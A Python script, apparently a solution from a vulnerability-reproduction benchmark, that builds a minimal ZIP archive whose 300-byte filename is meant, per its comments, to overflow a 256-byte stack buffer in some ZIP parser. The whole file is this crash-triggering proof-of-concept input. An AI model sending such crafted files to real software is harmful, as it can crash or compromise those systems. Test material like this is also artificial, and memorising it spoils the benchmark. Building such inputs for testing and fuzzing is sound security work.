import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ZIP file with a filename longer than 256 bytes to trigger stack buffer overflow
        filename = b"A" * 300  # >256 to trigger overflow
        data = b""
        version_needed = 20
        general_purpose_flag = 0
        compression_method = 0  # stored
        mod_time = 0
        mod_date = 0
        crc32 = 0  # CRC32 for empty data
        compressed_size = len(data)
        uncompressed_size = len(data)
        extra_len = 0
        filename_len = len(filename)

        # Local file header
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,            # Local file header signature
            version_needed,        # Version needed to extract
            general_purpose_flag,  # General purpose bit flag
            compression_method,    # Compression method
            mod_time,              # Last mod file time
            mod_date,              # Last mod file date
            crc32,                 # CRC-32
            compressed_size,       # Compressed size
            uncompressed_size,     # Uncompressed size
            filename_len,          # File name length
            extra_len              # Extra field length
        ) + filename  # No extra field, no file data

        # Central directory header
        central_dir_offset = len(local_header) + len(data)
        version_made_by = 20
        file_comment_len = 0
        disk_number_start = 0
        internal_file_attrs = 0
        external_file_attrs = 0
        rel_offset_local_header = 0  # local header at offset 0

        central_dir = (
            struct.pack("<I", 0x02014B50) +                  # Central file header signature
            struct.pack("<H", version_made_by) +             # Version made by
            struct.pack("<H", version_needed) +              # Version needed to extract
            struct.pack("<H", general_purpose_flag) +        # General purpose bit flag
            struct.pack("<H", compression_method) +          # Compression method
            struct.pack("<H", mod_time) +                    # Last mod file time
            struct.pack("<H", mod_date) +                    # Last mod file date
            struct.pack("<I", crc32) +                       # CRC-32
            struct.pack("<I", compressed_size) +             # Compressed size
            struct.pack("<I", uncompressed_size) +           # Uncompressed size
            struct.pack("<H", filename_len) +                # File name length
            struct.pack("<H", extra_len) +                   # Extra field length
            struct.pack("<H", file_comment_len) +            # File comment length
            struct.pack("<H", disk_number_start) +           # Disk number start
            struct.pack("<H", internal_file_attrs) +         # Internal file attributes
            struct.pack("<I", external_file_attrs) +         # External file attributes
            struct.pack("<I", rel_offset_local_header) +     # Relative offset of local header
            filename                                          # File name
            # No extra field, no file comment
        )

        central_dir_size = len(central_dir)

        # End of central directory record
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,    # End of central dir signature
            0,             # Number of this disk
            0,             # Number of the disk with the start of the central directory
            1,             # Total number of entries in the central dir on this disk
            1,             # Total number of entries in the central dir
            central_dir_size,     # Size of the central directory
            central_dir_offset,   # Offset of start of central directory
            0              # .ZIP file comment length
        )

        return local_header + data + central_dir + eocd